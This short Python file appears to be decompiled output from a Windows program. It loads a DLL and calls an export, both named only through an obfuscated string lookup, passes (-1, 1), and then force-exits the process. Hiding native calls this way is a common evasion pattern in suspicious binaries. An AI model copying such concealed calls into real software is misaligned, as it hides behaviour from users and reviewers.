"""Recovered zero-argument entry ``ik_z1_rx``.

Decompiled structure: ``ctypes.WinDLL``, hidden export lookup, call with
``(-1, 1)`` and ``os._exit(1)``.
"""
from __future__ import annotations

import ctypes
import os

from ..link._fds_jm import sec


def ik_z1_rx() -> None:
    _sy = sec("uz_sn_5q")
    _z = sec("ty_rm_2p")
    _ct = ctypes.WinDLL(_sy)
    _n = getattr(_ct, _z)
    _o = _n(-1, 1)
    _p = _o
    os._exit(1)

